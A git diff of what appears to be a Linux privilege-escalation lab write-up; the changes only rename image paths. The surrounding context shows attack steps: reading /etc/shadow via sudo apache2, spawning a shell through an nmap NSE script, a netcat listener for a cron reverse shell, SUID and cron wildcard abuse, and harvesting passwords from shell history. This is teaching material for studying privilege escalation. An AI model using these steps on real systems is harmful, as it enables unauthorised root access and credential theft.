@@ -203,7 +203,7 @@ We can use apache2 to read files and crack hashes.
 sudo apache2 -f /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 ### **nmap**
 
@@ -226,7 +226,7 @@ nmap> !sh
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ftp
 
@@ -478,7 +478,7 @@ Set up a netcat listener on your Kali box on port 4444 and wait for the cron job
 nc -nvlp 4444
 ```
 
-<figure><img src="../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -537,7 +537,7 @@ View the contents of the other cron job script
 cat /usr/local/bin/compress.sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 Note that the tar command is being run with a wildcard (\*) in your home directory.
 
@@ -664,7 +664,7 @@ Execute the suid-so executable again, and note that this time, instead of a prog
 /usr/local/bin/suid-so
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## SUID / SGID Executables - Environment Variables
 
@@ -688,7 +688,7 @@ Run strings on the file to look for strings of printable characters.
 strings /usr/local/bin/suid-env
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
 
@@ -800,7 +800,7 @@ View the contents of all the hidden history files in the user's home directory.
 cat ~/.*history | less
 ```
 
-<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (22) (5).png" alt=""><figcaption></figcaption></figure>
 
 Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
 
@@ -970,7 +970,7 @@ Once the exploit completes, run /usr/bin/passwd to gain a root shell:
 /usr/bin/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
